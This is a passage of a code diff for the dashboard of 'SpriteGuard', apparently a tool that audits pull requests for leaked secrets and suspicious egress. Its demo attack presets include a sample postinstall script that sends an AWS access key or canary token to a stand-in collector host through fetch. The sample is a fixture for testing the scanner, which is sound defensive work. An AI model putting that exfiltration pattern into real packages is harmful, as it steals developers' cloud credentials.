-              '<div class="gh-body">' +
-                (md ? renderMarkdownBlocks(md) : '<p class="muted">Report markdown not generated yet.</p>') +
-              '</div>' +
-            '</div>';
-        } else if (state.activeTab === 'json') {
-          body = '<pre>' + esc(JSON.stringify({ scan: item, patch: patch || null }, null, 2)) + '</pre>';
-        } else {
-          const findingsHtml = (rep && rep.audit && rep.audit.findings && rep.audit.findings.length)
-            ? rep.audit.findings.map((f) =>
-                '<div class="finding-card">' +
-                  '<div style="display:flex;justify-content:space-between;gap:8px;align-items:center">' +
-                    '<strong>' + esc(f.title) + '</strong>' +
-                    '<span class="badge sev-' + esc(cap(f.severity)) + '">' + esc(f.severity.toUpperCase()) + '</span>' +
-                  '</div>' +
-                  '<div class="mono muted" style="margin:4px 0">' + esc(f.file) + ':' + esc(f.line) + ' · ' + esc(f.category) + ' · source=' + esc(f.source) + '</div>' +
-                  '<div style="font-size:12px"><strong>Evidence:</strong> <span class="mono">' + esc(f.evidence) + '</span></div>' +
-                  '<div style="font-size:12px;margin-top:4px"><strong>Exploitability:</strong> ' + esc(f.exploitability) + '</div>' +
-                  '<div style="font-size:12px;margin-top:4px"><strong>Remediation:</strong> ' + esc(f.remediation) + '</div>' +
-                '</div>'
-              ).join('')
-            : '<div class="muted" style="margin-bottom:10px">No findings recorded.</div>';
-
-          const egressList = (item.egressDomains || []).length
-            ? '<div style="margin:12px 0"><strong>Outbound Egress Domains:</strong> ' +
-              item.egressDomains.map((d) =>
-                '<span class="badge ' + (d.flagged ? 'sev-High' : 'sev-Low') + '" style="margin-right:6px">' +
-                esc(d.host) + ' (' + esc(d.hits) + ' hits)</span>'
-              ).join('') + '</div>'
-            : '';
-
-          const diffHtml = patch
-            ? '<div style="margin-top:12px"><div style="margin-bottom:6px"><strong>Verified Patch Diff</strong> · status=<span class="mono">' + esc(patch.status) + '</span> · tests=<span class="mono">' + esc(patch.verification?.testsAfter?.summary || '—') + '</span></div><pre>' + renderDiffCode(patch.diff || '') + '</pre></div>'
-            : '';
-
-          body = findingsHtml + egressList + diffHtml;
-        }
-
-        const isAsking = Boolean(state.qaLoading[item.id]);
-        const draft = state.qaDrafts[item.id] || '';
-        const reply = state.qaReplies[item.id];
-        const qaAnswerHtml = isAsking
-          ? '<div class="qa-answer loading"><span class="spinner"></span>Querying SpriteGuard...</div>'
-          : reply
-            ? '<div class="qa-answer">' + renderMarkdownBlocks(reply) + '</div>'
-            : '';
-
-        const qaHtml = isLocal
-          ? '<form class="qa-box" data-ask-form="' + esc(item.id) + '">' +
-              '<input type="text" data-ask-input="' + esc(item.id) + '" value="' + esc(draft) + '"' + (isAsking ? ' disabled' : '') + ' placeholder="Ask @spriteguard a question about this PR (e.g., Why was egress flagged?)" />' +
-              '<button type="submit"' + (isAsking ? ' disabled' : '') + '>' +
-                (isAsking ? '<span class="spinner"></span>Querying SpriteGuard...' : 'Ask @spriteguard') +
-              '</button>' +
-            '</form>' +
-            qaAnswerHtml
-          : '';
-
-        return (
-          '<tr class="detail-row"><td colspan="8">' +
-            '<div class="tabs">' +
-              '<button class="tab-btn ' + (state.activeTab === 'evidence' ? 'active' : '') + '" data-tab="evidence">Findings, Egress &amp; Patch</button>' +
-              '<button class="tab-btn ' + (state.activeTab === 'markdown' ? 'active' : '') + '" data-tab="markdown">PR Markdown Report</button>' +
-              '<button class="tab-btn ' + (state.activeTab === 'json' ? 'active' : '') + '" data-tab="json">Raw JSON</button>' +
-              '<span class="mono muted" style="margin-left:auto">Sprite: ' + esc(item.spriteName || 'none') + (item.checkpointId ? ' · checkpoint ' + esc(item.checkpointId) : '') + '</span>' +
-            '</div>' +
-            body +
-            qaHtml +
-          '</td></tr>'
-        );
-      }
-
-      function cap(s) {
-        return s ? s.charAt(0).toUpperCase() + s.slice(1) : 'Low';
-      }
-
-      async function runDemo() {
-        const btn = document.getElementById('run-demo-btn');
-        const kind = document.getElementById('demo-kind').value;
-        btn.disabled = true;
-        btn.innerHTML = '<span class="spinner"></span>Running Sprite Audit...';
-        try {
-          const res = await fetch('/api/demo/trigger', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', ...authHeaders() },
-            body: JSON.stringify({ kind }),
-          });
-          const data = await res.json();
-          if (!res.ok) throw new Error(data.error || 'Demo audit failed');
-          state.expandedId = data.scan.id;
-          toast('Audited ' + data.scan.repoFullName + '#' + data.scan.prNumber + ' (Risk ' + data.scan.riskScore + '/100)', 'success');
-          await fetchScans();
-        } catch (err) {
-          toast('Error: ' + err.message, 'error');
-        } finally {
-          btn.disabled = false;
-          btn.textContent = 'Run Demo PR Audit';
-        }
-      }
-
-      async function approveDemoScan(scanId) {
-        if (state.approving[scanId]) return;
-        state.approving[scanId] = true;
-        render(state.lastData);
-        try {
-          const res = await fetch('/api/demo/scans/' + encodeURIComponent(scanId) + '/approve', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', ...authHeaders() },
-            body: JSON.stringify({ approver: 'alice-maintainer' }),
-          });
-          const data = await res.json();
-          if (!res.ok || !data.ok) throw new Error(data.reason || data.error || 'Approval rejected');
-          toast('Approved & pushed verified fix (' + (data.commitSha || '').slice(0, 7) + ')', 'success');
-          await fetchScans();
-        } catch (err) {
-          toast('Approval failed: ' + err.message, 'error');
-        } finally {
-          delete state.approving[scanId];
-          render(state.lastData);
-        }
-      }
-
-      async function askDemoQuestion(scanId, question) {
-        state.qaLoading[scanId] = true;
-        state.qaDrafts[scanId] = question;
-        render(state.lastData);
-        try {
-          const res = await fetch('/api/demo/scans/' + encodeURIComponent(scanId) + '/ask', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', ...authHeaders() },
-            body: JSON.stringify({ asker: 'alice-maintainer', question }),
-          });
-          const data = await res.json();
-          state.qaReplies[scanId] = data.answer || data.error || 'No response';
-          state.qaDrafts[scanId] = '';
-        } catch (err) {
-          state.qaReplies[scanId] = 'Error: ' + err.message;
-        } finally {
-          delete state.qaLoading[scanId];
-          render(state.lastData);
-        }
-      }
-
-      function setupRefresh() {
-        clearInterval(state.timer);
-        if (state.auto) {
-          state.timer = setInterval(fetchScans, 5000);
-        }
-        document.getElementById('toggle-auto').textContent = state.auto ? 'Pause' : 'Resume';
-        document.getElementById('refresh-pill').textContent = state.auto ? 'Auto-refresh 5s' : 'Auto-refresh paused';
-      }
+      const FL = {
+        all: ['All', () => true],
+        rev: ['Needs review', (d) => d.status === 'awaiting_approval' || d.status === 'needs_review' || d.status === 'running' || d.status === 'queued'],
+        ok: ['Clean', (d) => d.status === 'clean' || d.status === 'pushed'],
+        bad: ['Failed', (d) => d.status === 'failed' || d.status === 'publish_failed'],
+      };
 
       const ATTACK_PRESETS = {
         'leaked-keys': {
@@ -1461,7 +2142,7 @@
           title: 'chore(deps): add build telemetry postinstall script',
           filename: 'scripts/postinstall.mjs',
           code: [
-            '// Exfiltrates CI/Sprite environment variables to an untrusted collector',
+            '// Exfiltrates Sprite environment variables to an unapproved domain',
             'export async function reportInstallTelemetry() {',
             '  const token = process.env.SPRITEGUARD_CANARY_KEY || process.env.AWS_ACCESS_KEY_ID || "";',
             '  await fetch(`http://exfil-collector.invalid/beacon?k=${encodeURIComponent(token)}`, {',
@@ -1492,34 +2173,1224 @@
         },
       };
 
-      function switchSandboxTab(tab) {
-        document.querySelectorAll('button[data-sandbox-tab]').forEach((b) => {
-          b.classList.toggle('active', b.getAttribute('data-sandbox-tab') === tab);
-        });
-        document.getElementById('sandbox-pane-fixtures').classList.toggle('active', tab === 'fixtures');
-        document.getElementById('sandbox-pane-custom').classList.toggle('active', tab === 'custom');
+      const CRED_ORDER = ['exposed', 'revoked', 'rotated'];
+      const CRED_META = {
+        exposed: ['Exposed', 'cr'],
+        revoked: ['Revocation reported', 'hi'],
+        rotated: ['Rotation reported', 'ok'],
+      };
+
+      const state = {
+        live: true,
+        pollTimer: null,
+        health: null,
+        healthError: '',
+        mode: 'production',
+        playgroundEnabled: false,
+        storeBackend: '—',
+        provider: '—',
+        model: '—',
+        scans: [],
+        detailsCache: {},
+        selId: null,
+        sourceFilter: ls('sg-src') || 'all',
+        statusFilter: ls('sg-flt') || 'all',
+        searchQuery: '',
+        tab: 'f',
+        openFindingKey: '',
+        threads: {},
+        qaLoading: {},
+        qaDrafts: {},
+        approving: {},
+        rescanning: {},
+        runningDemo: false,
+        runningCustom: false,
+        runningUrl: false,
+        pgTab: 'fixtures',
+        credState: (() => {
+          try {
+            return JSON.parse(ls('sg-cred') || '{}') || {};
+          } catch {
+            return {};
+          }
+        })(),
+        credTime: {},
+        palIdx: 0,
+        palItems: [],
+      };
+
+      function authHeaders() {
+        const params = new URLSearchParams(location.search);
+        const token = params.get('token') || ls('sg_dashboard_token');
+        return token ? { Authorization: 'Bearer ' + token } : {};
       }
 
-      function applyAttackPreset(key) {
-        const preset = ATTACK_PRESETS[key];
-        if (!preset) return;
-        document.getElementById('custom-title').value = preset.title;
-        document.getElementById('custom-filename').value = preset.filename;
-        document.getElementById('custom-code').value = preset.code;
+      const toast = (() => {
+        let timer;
+        return (msg, isErr = false) => {
+          const t = $('#t');
+          t.textContent = msg;
+          t.className = 'on' + (isErr ? ' err' : '');
+          clearTimeout(timer);
+          timer = setTimeout(() => {
+            t.className = '';
+          }, 2800);
+        };
+      })();
+
+      let undoTimer;
+      function undoToast(msg, undoFn) {
+        const t = $('#t');
+        t.className = 'on';
+        t.textContent = msg + ' ';
+        const b = document.createElement('button');
+        b.className = 'ub';
+        b.textContent = 'Undo';
+        b.onclick = () => {
+          undoFn();
+          t.className = '';
+        };
+        t.append(b);
+        clearTimeout(undoTimer);
+        undoTimer = setTimeout(() => {
+          t.className = '';
+        }, 5000);
+      }
+
+      function applyTheme(theme) {
+        const t = theme === 'light' ? 'light' : 'dark';
+        document.documentElement.setAttribute('data-theme', t);
+        ls('sg-theme', t);
+        const btn = $('#theme-btn');
+        if (btn) btn.textContent = t === 'dark' ? 'Dark' : 'Light';
+      }
+      applyTheme(ls('sg-theme') || 'dark');
+
+      const isPlaygroundScan = (scan) => /^(acme|playground|demo)\//i.test(scan.repoFullName || '');
+      const needsAttention = (scan) =>
+        scan.status === 'awaiting_approval' || scan.status === 'needs_review' || scan.status === 'running' || scan.status === 'queued';
+      const sevMeta = (score) => {
+        const r = Number(score ?? 0);
+        if (r >= 75) return ['Critical', 'cr'];
+        if (r >= 50) return ['High', 'hi'];
+        if (r >= 25) return ['Medium', 'md'];
+        return ['Low', 'ok'];
+      };
+      const gauge = (score, colorVar) => {
+        const r = Number(score ?? 0);
+        const on = Math.round(r / 10);
+        return `<span class="gauge" style="color:var(--${colorVar})" aria-hidden="true">${[...Array(10)]
+          .map((_, i) => `<i class="${i < on ? 'on' : ''}"></i>`)
+          .join('')}</span>`;
+      };
+      const statusChip = (scan) => {
+        const [label, c] = ST[scan.status] || [scan.status, 'mu'];
+        return `<span class="chip" style="color:var(--${c})">${esc(label)}</span>`;
+      };
+
+      function getFindings(scan) {
+        return (scan.report && scan.report.audit && Array.isArray(scan.report.audit.findings)
+          ? scan.report.audit.findings
+          : []) || [];
+      }
+
+      function findingCredKey(scan, finding, idx) {
+        return `${scan.id}:${finding.id || idx}`;
+      }
+
+      function isSecretFinding(f) {
+        return f && (f.category === 'secret_leak' || f.category === 'data_exposure');
+      }
+
+      function getCredStatus(scan, finding, idx) {
+        if (!isSecretFinding(finding)) return null;
+        const k = findingCredKey(scan, finding, idx);
+        return state.credState[k] || 'exposed';
+      }
+
+      function countExposedSecrets(scansList) {
+        let count = 0;
+        for (const s of scansList) {
+          if (s.status === 'superseded' || s.status === 'running' || s.status === 'queued' || s.status === 'closed') continue;
+          const findings = getFindings(s);
+          const secretFindings = findings.filter(isSecretFinding);
+          if (secretFindings.length > 0) {
+            findings.forEach((f, idx) => {
+              if (isSecretFinding(f) && getCredStatus(s, f, idx) === 'exposed') count++;
+            });
+          } else {
+            count += Number(s.secretsCount || 0);
+          }
+        }
+        return count;
+      }
+
+      function sourceFilteredScans() {
+        if (state.sourceFilter === 'live') return state.scans.filter((s) => !isPlaygroundScan(s));
+        if (state.sourceFilter === 'playground') return state.scans.filter((s) => isPlaygroundScan(s));
+        return state.scans;
+      }
+
+      function visibleScans() {
+        const q = state.searchQuery;
+        const base = sourceFilteredScans()
+          .filter(FL[state.statusFilter][1])
+          .filter((d) => !q || `${d.repoFullName}#${d.prNumber} ${d.prTitle} ${d.headSha}`.toLowerCase().includes(q));
+        return [...base.filter(needsAttention), ...base.filter((d) => !needsAttention(d))];
+      }
+
+      function selectedScan() {
+        return state.scans.find((s) => s.id === state.selId) || null;
+      }
+
+      function updateBrandLogo(activeSprites, sleepingSprites) {
+        const logo = $('#brand-logo');
+        if (!logo) return;
+        let nextState = 'idle';
+        let label = 'SpriteGuard — no active Sprites';
+        if (activeSprites > 0) {
+          nextState = 'active';
+          label = `SpriteGuard — ${activeSprites} active Sprite${activeSprites === 1 ? '' : 's'}`;
+        } else if (sleepingSprites > 0) {
+          nextState = 'sleeping';
+          label = `SpriteGuard — ${sleepingSprites} sleeping Sprite${sleepingSprites === 1 ? '' : 's'}`;
+        }
+        logo.dataset.spriteState = nextState;
+        const brand = logo.closest('.brand');
+        if (brand) brand.title = label;
+      }
+
+      function renderStats() {
+        const liveScans = state.scans.filter((s) => !isPlaygroundScan(s));
+        let target = state.scans;
+        let scopeLabel = 'All';
+        if (state.sourceFilter === 'live') {
+          target = liveScans;
+          scopeLabel = 'Live repos';
+        } else if (state.sourceFilter === 'playground') {
+          target = state.scans.filter((s) => isPlaygroundScan(s));
+          scopeLabel = 'Playground';
+        } else if (liveScans.length > 0) {
+          target = liveScans;
+          scopeLabel = 'Live repos';
+        } else if (state.scans.length > 0) {
+          scopeLabel = 'Playground';
+        }
+
+        const activePool = target.filter((s) => s.status !== 'superseded');
+        const completed = activePool.filter((s) => s.status !== 'queued' && s.status !== 'running');
+        const pushed = activePool.filter((s) => s.status === 'pushed').length;
+        const awaiting = activePool.filter((s) => s.status === 'awaiting_approval').length;
+        const scored = activePool.filter((s) => s.riskScore !== null && s.riskScore !== undefined);
+        const avg = scored.length ? Math.round(scored.reduce((a, s) => a + Number(s.riskScore || 0), 0) / scored.length) : 0;
+        const [, avgColor] = sevMeta(avg);
+        const totalSecrets = activePool.reduce((a, s) => a + Number(s.secretsCount || 0), 0);
+        const stillExposed = countExposedSecrets(activePool);
+        const activeSprites = state.scans.filter((s) => s.spriteState === 'creating' || s.spriteState === 'running').length;
+        const sleepingSprites = state.scans.filter((s) => s.spriteState === 'sleeping').length;
+        updateBrandLogo(activeSprites, sleepingSprites);
+        const modelText = `${state.model || '—'} · ${state.storeBackend || '—'}`;
+
+        $('#stats').innerHTML = `
+          <div>
+            <span class="l">PRs audited <em>${esc(scopeLabel)}</em></span>
+            <b>${completed.length}</b>
+            <small>${pushed} pushed, ${awaiting} awaiting</small>
+          </div>
+          <div>
+            <span class="l">Secrets found <em>${esc(scopeLabel)}</em></span>
+            <b>${totalSecrets}</b>
+            <small style="color:var(--${stillExposed ? 'cr' : 'ok'})">${stillExposed} still exposed</small>
+          </div>
+          <div>
+            <span class="l">Average risk</span>
+            <b>${avg}<span> of 100</span></b>
+            ${gauge(avg, avgColor)}
+          </div>
+          <div>
+            <span class="l">Sprites</span>
+            <b>${activeSprites} / ${sleepingSprites}</b>
+            <small>${esc(modelText)}</small>
+          </div>
+        `;
+      }
+
+      function renderGettingStarted() {
+        const liveScans = state.scans.filter((s) => !isPlaygroundScan(s));
+        const hasLive = liveScans.length > 0;
+        const repoCount = new Set(liveScans.map((s) => s.repoFullName)).size;
+        const anyFinished = state.scans.some((s) => s.status !== 'queued' && s.status !== 'running');
+        const triedSandbox = ls('sg-demo') === '1' || state.scans.some((s) => isPlaygroundScan(s));
+        const reviewedFinding = ls('sg-rev') === '1';
+
+        const steps = [
+          [
+            'Connect a repository',
+            hasLive ? 1 : 0,
+            hasLive
+              ? `Audits received from ${repoCount} repositor${repoCount === 1 ? 'y' : 'ies'}.`
+              : 'Add the webhook and grant Read and Write split connectors.',
+            hasLive ? '' : 'Connect repo',
+            'cn',
+          ],
+          [
+            'Check permissions',
+            null,
+            'Read connector audits PRs inside Sprites. Write connector only pushes after maintainer approval.',
+            '',
+            '',
+          ],
+          [
+            'Confirm webhook delivery',
+            hasLive ? 1 : 0,
+            hasLive
+              ? `${liveScans.length} live audit${liveScans.length === 1 ? '' : 's'} recorded from GitHub.`
+              : 'Waiting for the first webhook event on /webhook.',
+            '',
+            '',
+          ],
+          [
+            'Complete a first audit',
+            anyFinished ? 1 : 0,
+            anyFinished ? 'At least one PR audit has completed.' : 'Open a PR, scan a public URL, or try the playground.',
+            '',
+            '',
+          ],
+          [
+            'Try the sandbox',
+            triedSandbox ? 1 : 0,
+            triedSandbox ? 'Sandbox audit executed.' : 'Run a demo fixture or custom code audit below.',
+            '',
+            '',
+          ],
+          [
+            'Review a finding',
+            reviewedFinding ? 1 : 0,
+            reviewedFinding ? 'You have inspected a security finding.' : 'Expand any finding card to inspect evidence and fix prompts.',
+            '',
+            '',
+          ],
+        ];
+
+        $('#gso').innerHTML = steps
+          .map(
+            ([title, done, desc, btnLabel, dlgId]) =>
+              `<li class="${done ? 'done' : ''}"><b>${esc(title)}<em>${
+                done === null ? 'Check on GitHub' : done ? 'Done' : 'To do'
+              }</em></b><span>${esc(desc)}</span>${
+                btnLabel ? `<button class="btn" data-open="${esc(dlgId)}">${esc(btnLabel)}</button>` : ''
+              }</li>`,
+          )
+          .join('');
+
+        const pref = ls('sg-gs');
+        $('#gs').hidden = pref === '0' || (steps.every((s) => s[1] !== 0) && pref !== '1');
+      }
+
+      function renderList() {
+        const allCount = state.scans.length;
+        const liveCount = state.scans.filter((s) => !isPlaygroundScan(s)).length;
+        const pgCount = state.scans.filter((s) => isPlaygroundScan(s)).length;
+
+        $('#src-seg').innerHTML = [
+          ['all', 'All Sources', allCount],
+          ['live', 'Live GitHub', liveCount],
+          ['playground', 'Playground', pgCount],
+        ]
+          .map(
+            ([k, l, cnt]) =>
+              `<button type="button" aria-pressed="${k === state.sourceFilter}" data-src="${k}">${l}<i>${cnt}</i></button>`,
+          )
+          .join('');
+
+        const srcScans = sourceFilteredScans();
+        $('#seg').innerHTML = Object.entries(FL)
+          .map(
+            ([k, [l, fn]]) =>
+              `<button type="button" aria-pressed="${k === state.statusFilter}" data-f="${k}">${l}<i>${srcScans.filter(fn).length}</i></button>`,
+          )
+          .join('');
+
+        const rowHtml = (d) => {
+          const score = d.riskScore ?? 0;
+          const [, col] = sevMeta(score);
+          const isDemo = isPlaygroundScan(d);
+          const isRunning = d.status === 'running' || d.status === 'queued';
+          const shortSha = (d.headSha || '').slice(0, 7) || '—';
+          const fc = Number(d.findingsCount || 0);
+          return `<button type="button" class="row" role="option" aria-selected="${d.id === state.selId}" data-id="${esc(d.id)}">
+            <span class="rk">${gauge(score, col)}<b>${isRunning ? '…' : score}</b></span>
+            <span style="min-width:0">
+              <div class="rt">${isDemo ? '<span class="dm">Demo</span>' : ''}${esc(d.prTitle)}</div>
+              <div class="rm">
+                <span>${esc(d.repoFullName)}#${esc(d.prNumber)}</span>
+                <span class="mono">${esc(shortSha)}</span>
+                <span>${isRunning ? 'Scanning' : `${fc} finding${fc === 1 ? '' : 's'}`}</span>
+                <span><i class="sp ${esc(d.spriteState || 'none')}"></i>${esc(d.spriteState || 'none')}</span>
+              </div>
+            </span>
+            ${statusChip(d)}
+          </button>`;
+        };
+
+        const vis = visibleScans();
+        const attn = vis.filter(needsAttention);
+        const rest = vis.filter((d) => !needsAttention(d));
+        $('#rows').innerHTML =
+          (attn.length ? `<div class="gl" style="border:0">Needs your attention</div>` + attn.map(rowHtml).join('') : '') +
+            (rest.length
+              ? `<div class="gl">${attn.length ? 'Earlier audits' : 'Audits'}</div>` + rest.map(rowHtml).join('')
+              : '') || `<div class="emp">No audits match this filter.</div>`;
+      }
+
+      /* Markdown Rendering (XSS-safe for both @spriteguard Q&A and PR Report Preview) */
+      function renderInlineMd(raw) {
+        let s = esc(raw).replace(/&amp;nbsp;/g, '&nbsp;');
+        const codes = [];
+        s = s.replace(/`([^`]+)`/g, (_, code) => {
+          const idx = codes.length;
+          let html = '<code>' + code + '</code>';
+          if (/🔴\s*CRITICAL/i.test(code)) html = '<span class="chip" style="color:var(--cr)">' + code + '</span>';
+          else if (/🟠\s*HIGH/i.test(code)) html = '<span class="chip" style="color:var(--hi)">' + code + '</span>';
+          else if (/🟡\s*MEDIUM/i.test(code)) html = '<span class="chip" style="color:var(--md)">' + code + '</span>';
+          else if (/🟢\s*LOW/i.test(code)) html = '<span class="chip" style="color:var(--ok)">' + code + '</span>';
+          codes.push(html);
+          return '\x00CODE' + idx + '\x00';
+        });
+        s = s.replace(/\[([^\]]+)\]\((https?:\/\/[^\s)]+)\)/g, '<a href="$2" target="_blank" rel="noopener noreferrer">$1</a>');
+        s = s.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
+        s = s.replace(/(^|[\s(])_([^_]+)_([\s).,!?:]|$)/g, '$1<em>$2</em>$3');
+        s = s.replace(/\x00CODE(\d+)\x00/g, (_, i) => codes[Number(i)] || '');
+        return s;
+      }
+
+      function renderMarkdownBlocks(md) {
+        if (!md) return '<p style="color:var(--mu)">Report markdown not generated yet.</p>';
+        const clean = String(md).replace(/<!--[\s\S]*?-->/g, '').replace(/\r\n/g, '\n');
+        const lines = clean.split('\n');
+        const out = [];
+        let i = 0;
+
+        while (i < lines.length) {
+          const line = lines[i];
+          const trimmed = line.trim();
+          if (!trimmed) {
+            i++;
+            continue;
+          }
+
+          if (trimmed === '<details>') {
+            let summaryText = 'Details';
+            const inner = [];
+            i++;
+            while (i < lines.length && lines[i].trim() !== '</details>') {
+              const sm = /^<summary>([\s\S]*?)<\/summary>$/i.exec(lines[i].trim());
+              if (sm) summaryText = sm[1].replace(/<\/?strong>/gi, '');
+              else inner.push(lines[i]);
+              i++;
+            }
+            if (i < lines.length) i++;
+            out.push(
+              `<details class="gh-details"><summary>${esc(summaryText)}</summary>${renderMarkdownBlocks(inner.join('\n'))}</details>`,
+            );
+            continue;
+          }
+
+          const fence = /^```(\w*)/.exec(trimmed);
+          if (fence) {
+            const lang = (fence[1] || '').toLowerCase();
+            const codeLines = [];
+            i++;
+            while (i < lines.length && !lines[i].trim().startsWith('```')) {
+              codeLines.push(lines[i]);
+              i++;
+            }
+            if (i < lines.length) i++;
+            const rawCode = codeLines.join('\n');
+            if (lang === 'diff') out.push(renderUnifiedDiff(rawCode));
+            else out.push(`<pre>${esc(rawCode)}</pre>`);
+            continue;
+          }
+
+          const hm = /^(#{2,4})\s+(.+)$/.exec(trimmed);
+          if (hm) {
+            const lvl = hm[1].length;
+            out.push(`<h${lvl}>${renderInlineMd(hm[2])}</h${lvl}>`);
+            i++;
+            continue;
+          }
+
+          if (trimmed.startsWith('>')) {
+            const qLines = [];
+            while (i < lines.length && lines[i].trim().startsWith('>')) {
+              qLines.push(lines[i].trim().replace(/^>\s?/, ''));
+              i++;
+            }
+            const callout = /^\[!(CAUTION|WARNING|IMPORTANT|NOTE|TIP)\]\s*$/i.exec(qLines[0] || '');
+            if (callout) {
+              const kind = callout[1].toLowerCase();
+              out.push(
+                `<div class="gh-callout ${esc(kind)}"><div class="gh-callout-title">${esc(
+                  callout[1].toUpperCase(),
+                )}</div>${renderMarkdownBlocks(qLines.slice(1).join('\n'))}</div>`,
+              );
+            } else {
+              out.push(`<blockquote>${qLines.map((l) => renderInlineMd(l)).join('<br>')}</blockquote>`);
+            }
+            continue;
+          }
+
+          if (trimmed.startsWith('|') && i + 1 < lines.length && /^\|[\s:-]+\|/.test(lines[i + 1].trim())) {
+            const parseCells = (row) => row.trim().replace(/^\||\|$/g, '').split('|').map((c) => c.trim());
+            const headers = parseCells(lines[i]);
+            i += 2;
+            const bodyRows = [];
+            while (i < lines.length && lines[i].trim().startsWith('|')) {
+              bodyRows.push(parseCells(lines[i]));
+              i++;
+            }
+            out.push(
+              `<table class="gh-table"><thead><tr>${headers
+                .map((h) => `<th>${renderInlineMd(h)}</th>`)
+                .join('')}</tr></thead><tbody>${bodyRows
+                .map((r) => `<tr>${r.map((c) => `<td>${renderInlineMd(c)}</td>`).join('')}</tr>`)
+                .join('')}</tbody></table>`,
+            );
+            continue;
+          }
+
+          if (/^\s*[-*]\s+/.test(line)) {
+            const items = [];
+            while (i < lines.length && /^\s*[-*]\s+/.test(lines[i])) {
+              let itemText = lines[i].replace(/^\s*[-*]\s+/, '');
+              if (/^\[ \]\s+/.test(itemText)) itemText = '☐ ' + itemText.slice(4);
+              else if (/^\[x\]\s+/i.test(itemText)) itemText = '☑ ' + itemText.slice(4);
+              items.push(`<li>${renderInlineMd(itemText)}</li>`);
+              i++;
+            }
+            out.push(`<ul>${items.join('')}</ul>`);
+            continue;
+          }
+
+          const para = [];
+          while (
+            i < lines.length &&
+            lines[i].trim() &&
+            !/^(#{2,4}\s|```|>|\||<details>|\s*[-*]\s+)/.test(lines[i].trim())
+          ) {
+            para.push(lines[i].trim());
+            i++;
+          }
+          if (para.length) out.push(`<p>${renderInlineMd(para.join(' '))}</p>`);
+          else i++;
+        }
+        return out.join('');
+      }
+
+      function renderUnifiedDiff(diffText) {
+        if (!diffText || !diffText.trim()) return '<div class="note ok"><b>No diff changes recorded.</b></div>';
+        const lines = diffText.replace(/\r\n/g, '\n').split('\n');
+        let lineNo = 0;
+        const rows = [];
+        for (const line of lines) {
+          if (line.startsWith('diff --git ')) {
+            const m = /^diff --git a\/(.+?) b\/(.+)$/.exec(line);
+            rows.push(`<div class="dl fhead">${esc(m ? m[2] : line)}</div>`);
+            continue;
+          }
+          if (line.startsWith('--- ') || line.startsWith('+++ ') || line.startsWith('index ')) continue;
+          if (line.startsWith('@@')) {
+            const hm = /@@ -\d+(?:,\d+)? \+(\d+)(?:,\d+)? @@/.exec(line);
+            lineNo = hm ? Number.parseInt(hm[1], 10) : 0;
+            rows.push(`<div class="dl hunk"><span></span><span></span><code>${esc(line)}</code></div>`);
+            continue;
+          }
+          if (line.startsWith('+')) {
+            rows.push(`<div class="dl a"><span>${lineNo || ''}</span><span>+</span><code>${esc(line.slice(1))}</code></div>`);
+            if (lineNo) lineNo++;
+          } else if (line.startsWith('-')) {
+            rows.push(`<div class="dl d"><span>${lineNo || ''}</span><span>−</span><code>${esc(line.slice(1))}</code></div>`);
+          } else {
+            const content = line.startsWith(' ') ? line.slice(1) : line;
+            rows.push(`<div class="dl"><span>${lineNo || ''}</span><span></span><code>${esc(content)}</code></div>`);
+            if (lineNo) lineNo++;
+          }
+        }
+        return `<div class="diff">${rows.join('')}</div>`;
+      }
+
+      function renderOverview(scan, findings) {
+        const risk = Number(scan.riskScore ?? 0);
+        const [, sc] = sevMeta(risk);
+        const sevCounts = {};
+        const weights = { critical: 34, high: 22, medium: 11, low: 4, info: 1 };
+        let secretWeight = 0;
+        let runtimeWeight = 0;
+
+        for (const f of findings) {
+          sevCounts[f.severity] = (sevCounts[f.severity] || 0) + 1;
+          const w = (weights[f.severity] || 4) * Math.min(1, Math.max(0.3, Number(f.confidence || 0.8)));
+          if (isSecretFinding(f)) secretWeight += w;
+          else runtimeWeight += w;
+        }
+        const totalW = secretWeight + runtimeWeight || 1;
+        const secPts = risk > 0 ? Math.round((risk * secretWeight) / totalW) : 0;
+        const runPts = risk > 0 ? Math.max(0, risk - secPts) : 0;
+
+        const sevColor = { critical: 'cr', high: 'hi', medium: 'md', low: 'ok', info: 'mu' };
+        const sevSummary = Object.entries(sevCounts)
+          .map(([k, v]) => `${v} ${k}`)
+          .join(', ');
+        const sevBars = Object.entries(sevCounts)
+          .map(([k, v]) => `<i title="${v} ${k}" style="flex:${v};background:var(--${sevColor[k] || 'mu'})"></i>`)
+          .join('');
+
+        const secretFindings = findings.filter(isSecretFinding);
+        const credStates = findings.map((f, i) => getCredStatus(scan, f, i)).filter(Boolean);
+        const exposedCreds = credStates.filter((s) => s === 'exposed').length;
+        const credBars = CRED_ORDER.slice()
+          .reverse()
+          .map((st) => {
+            const n = credStates.filter((s) => s === st).length;
+            return n ? `<i title="${n} ${st}" style="flex:${n};background:var(--${CRED_META[st][1]})"></i>` : '';
+          })
+          .join('');
+
+        return `<div class="ov">
+          <div>
+            <div class="ovh"><b>Severity</b><span>${esc(sevSummary || 'None')}</span></div>
+            <div class="sb">${sevBars}</div>
+          </div>
+          <div>
+            <div class="ovh"><b>Risk contributions</b><span>${risk} of 100</span></div>
+            ${
+              secPts
+                ? `<div class="cb"><span>Secrets</span><div><i style="width:${secPts}%;background:var(--${sc})"></i></div><b>+${secPts}</b></div>`
+                : ''
+            }
+            ${
+              runPts
+                ? `<div class="cb"><span>Runtime &amp; egress</span><div><i style="width:${runPts}%;background:var(--${sc})"></i></div><b>+${runPts}</b></div>`
+                : ''
+            }
+          </div>
+          ${
+            secretFindings.length
+              ? `<div>
+                  <div class="ovh"><b>Credentials</b><span style="color:var(--${exposedCreds ? 'cr' : 'ok'})">${exposedCreds} of ${secretFindings.length} still exposed</span></div>
+                  <div class="sb">${credBars}</div>
+                </div>`
+              : ''
+          }
+        </div>`;
+      }
+
+      function renderFindingBody(scan, f, idx) {
+        const isSec = isSecretFinding(f);
+        const patch = scan.patch;
+        const st = getCredStatus(scan, f, idx);
+        const credIdx = CRED_ORDER.indexOf(st);
+        const loc = f.line > 0 ? `${f.file}:${f.line}` : f.file;
+        const codeFix =
+          scan.status === 'pushed'
+            ? 'patch pushed'
+            : patch
+              ? 'patch proposed, not yet approved'
+              : 'no patch generated';
+
+        let verifyText = 'No patch verification record for this scan.';
+        if (patch && patch.verification) {
+          const v = patch.verification;
+          verifyText = v.testsAfter.ran
